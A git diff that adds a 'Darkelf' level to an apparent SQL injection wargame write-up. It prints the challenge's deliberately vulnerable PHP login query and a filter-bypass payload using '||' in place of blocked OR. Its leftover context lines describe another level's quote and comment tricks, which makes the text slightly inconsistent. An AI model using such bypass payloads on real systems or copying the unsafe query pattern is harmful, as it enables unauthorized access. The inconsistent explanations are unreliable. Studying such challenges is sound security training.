@@ -166,6 +166,33 @@ while 1:
 ?>
 ```
 
+##  Level 6 - Darkelf
+
+##### Source code
+
+
+```php
+<?php 
+  <?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect();  
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
+  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+  if($result['id'] == 'admin') solve("darkelf"); 
+  highlight_file(__FILE__); 
+?>
+?>
+```
+
+##### Here OR and AND are being blocked . So to get around that we can use || and && instead since the both are equivalent in mysql . 
+
+##### So the payload becomes : pw=' || id='admin
+
 ##### Here quotes are being blocked . So to get around that we can use /**/ wherever space is needed since mysql treats this as spaces .
 
 ##### So the payload becomes : pw='/\**/or/**/id='admin
